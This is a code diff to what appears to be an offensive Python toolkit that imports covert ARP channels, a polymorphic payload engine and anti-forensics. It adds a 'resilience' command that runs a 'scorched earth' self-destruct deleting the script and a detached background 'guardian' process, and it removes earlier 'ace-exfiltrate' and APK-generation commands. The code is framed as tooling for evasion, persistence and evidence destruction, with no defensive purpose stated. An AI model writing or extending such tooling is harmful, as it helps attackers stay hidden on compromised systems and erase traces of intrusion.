@@ -18,6 +18,8 @@ from modules.discovery import discover_files
 from modules.wizard import encode_wizard
 from modules.covert_channel import send_arp_covert, listen_arp_covert
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
+from modules.anti_forensics import scorched_earth
+import subprocess
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -133,6 +135,12 @@ def main():
     # Wizard
     wizard_parser = subparsers.add_parser("wizard", help="Run an interactive wizard")
     wizard_parser.add_argument("--mode", required=True, choices=['encode'], help="Wizard mode to run")
+
+    # Resilience
+    resilience_parser = subparsers.add_parser("resilience", help="Manage resilience features")
+    resilience_parser.add_argument("--enable-guardian", action="store_true", help="Enable Guardian mode")
+    resilience_parser.add_argument("--self-destruct", action="store_true", help="Activate Scorched Earth policy")
+
 
     args = parser.parse_args()
 
@@ -268,11 +276,15 @@ def main():
             if args.mode == 'encode':
                 encode_wizard()
 
-        elif args.command == "ace-exfiltrate":
-            ace_exfiltrate(args.data.encode(), args.target)
-
-        elif args.command == "generate-apk":
-            generate_apk(args.output)
+        elif args.command == "resilience":
+            if args.self_destruct:
+                scorched_earth(script_path)
+                # The script will be deleted, so we must exit.
+                sys.exit(0)
+            if args.enable_guardian:
+                logging.info("Enabling Guardian mode... The guardian will run in the background.")
+                # Detach the guardian process
+                subprocess.Popen([sys.executable, "guardian.py", script_path], close_fds=True)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
